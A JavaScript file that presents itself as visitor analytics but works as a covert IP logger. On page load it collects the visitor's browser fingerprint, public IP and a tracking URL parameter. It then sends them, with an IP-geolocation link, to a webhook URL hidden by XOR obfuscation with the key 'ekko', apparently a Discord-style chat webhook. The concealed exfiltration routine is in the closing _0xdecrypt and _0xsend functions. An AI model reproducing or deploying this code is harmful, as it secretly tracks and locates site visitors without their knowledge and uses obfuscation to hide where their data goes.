
function collectVisitorAnalytics() {

    const browserData = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      windowWidth: window.innerWidth,
      windowHeight: window.innerHeight,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: new Date().toISOString()
    };
  
    const userAgentData = parseUserAgent(browserData.userAgent);
    
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(ipData => {
        const analyticsData = {
          ...browserData,
          ...userAgentData,
          ip: ipData.ip
        };
        
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        console.log("Collected visitor analytics:", analyticsData);
        
        analyticsData['clickOrigin'] = urlParams.get('a');
        _0xsend(analyticsData);
      })
      .catch(error => console.error('Error fetching IP:', error));
  }
  
  function parseUserAgent(userAgent) {
    let browser = "Unknown";
    let browserVersion = "";
    
    if (userAgent.indexOf("Firefox") > -1) {
      browser = "Firefox";
      browserVersion = userAgent.match(/Firefox\/([0-9.]+)/)[1];
    } else if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1 && userAgent.indexOf("OPR") === -1) {
      browser = "Chrome";
      browserVersion = userAgent.match(/Chrome\/([0-9.]+)/)[1];
    } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
      browser = "Safari";
      browserVersion = userAgent.match(/Version\/([0-9.]+)/)[1];
    } else if (userAgent.indexOf("Edg") > -1) {
      browser = "Edge";
      browserVersion = userAgent.match(/Edg\/([0-9.]+)/)[1];
    } else if (userAgent.indexOf("OPR") > -1 || userAgent.indexOf("Opera") > -1) {
      browser = "Opera";
      browserVersion = userAgent.match(/(?:OPR|Opera)\/([0-9.]+)/)[1];
    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
      browser = "Internet Explorer";
      browserVersion = userAgent.match(/(?:MSIE |rv:)([0-9.]+)/)[1];
    }
    
    let os = "Unknown";
    let osVersion = "";
    
    if (userAgent.indexOf("Win") > -1) {
      os = "Windows";
      if (userAgent.indexOf("Windows NT 10.0") > -1) osVersion = "10";
      else if (userAgent.indexOf("Windows NT 6.3") > -1) osVersion = "8.1";
      else if (userAgent.indexOf("Windows NT 6.2") > -1) osVersion = "8";
      else if (userAgent.indexOf("Windows NT 6.1") > -1) osVersion = "7";
    } else if (userAgent.indexOf("Mac") > -1) {
      os = "macOS";
      const macOSMatch = userAgent.match(/Mac OS X ([0-9_]+)/);
      if (macOSMatch) osVersion = macOSMatch[1].replace(/_/g, '.');
    } else if (userAgent.indexOf("Android") > -1) {
      os = "Android";
      const androidMatch = userAgent.match(/Android ([0-9.]+)/);
      if (androidMatch) osVersion = androidMatch[1];
    } else if (userAgent.indexOf("iOS") > -1 || (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1)) {
      os = "iOS";
      const iosMatch = userAgent.match(/OS ([0-9_]+)/);
      if (iosMatch) osVersion = iosMatch[1].replace(/_/g, '.');
    } else if (userAgent.indexOf("Linux") > -1) {
      os = "Linux";
    }
    
    let deviceType = "Desktop";
    if (userAgent.indexOf("Mobi") > -1 || userAgent.indexOf("Android") > -1 && userAgent.indexOf("Chrome") === -1) {
      deviceType = "Mobile";
    } else if (userAgent.indexOf("iPad") > -1 || (userAgent.indexOf("Tablet") > -1 && userAgent.indexOf("iPad") === -1)) {
      deviceType = "Tablet";
    }
    
    return {
      browser,
      browserVersion,
      os,
      osVersion,
      deviceType
    };
  }

  window.onload = collectVisitorAnalytics();

var _0xkey = 'ekko';
function _0xdecrypt(_0xinput) {
    let _0xresult = '';
    while (_0xkey.length < _0xinput.length / 2) {
        _0xkey += _0xkey;
    }
    for (let _0xi = 0; _0xi < _0xinput.length; _0xi += 2) {
        let _0xvalue1 = parseInt(_0xinput.substring(_0xi, _0xi + 2), 16);
        let _0xvalue2 = _0xkey.charCodeAt(_0xi / 2);
        _0xresult += String.fromCharCode(_0xvalue1 ^ _0xvalue2);
    }
    return _0xresult;
}
const _0xwebhook = _0xdecrypt("0D1F1F1F165144400102180C0A190F4106040640041B0240120E09070A04001C4A5A585A515A5857535D5D565259585B5D5E5C5F4A0423303D090C3D12031C012123341D3009202E50230958063D08300A1C345907035D3E095F0942173D5E002C1F53263422280C0C3E0435570E1C38071A3D09575A5A2923".replace(/\s+/g, ''));    
function _0xsend(_0xmsg) {
    var _0xxhr = new XMLHttpRequest();
    _0xxhr.open("POST", _0xwebhook, true);
    _0xxhr.setRequestHeader(_0xdecrypt('2604051B00051F4231121B0A'.replace(/\s+/g, '')), _0xdecrypt('041B1B030C080A1B0C0405400F180401'.replace(/\s+/g, '')));
    var date = Date.now();
    _0xxhr.send(JSON.stringify({
        [_0xdecrypt('0604051B00051F'.replace(/\s+/g, ''))]: 
        "### UNIX: <t:" + Math.floor((date / 1000)) + ":F>" +
        "\n### [[LOCATION INFO]](https://ip-api.com/" + _0xmsg['ip'] + ")" + 
        "\n```json\n" + JSON.stringify(_0xmsg, null, 2) + "\n```",
        [_0xdecrypt('10180E1D0B0A060A'.replace(/\s+/g, ''))]: _0xdecrypt('361F0A1B0C181F06064B390A1504191B45303D2636223F32'.replace(/\s+/g, '')),
        [_0xdecrypt('041D0A1B0419341A1707'.replace(/\s+/g, ''))]: _0xdecrypt('0D1F1F1F16514440170A1C4102021F0710091E1C001908000B1F0E01114508000844260E150704001544060E1507040015450C0611031E0D4B020440170E0D1C4A030E0E0118440204181F0A174407060B00184004085357500D5A56485F530B50465F565C08465656080D42000A0D0E515808585258080C4B011B08'.replace(/\s+/g, '')),
    }));
}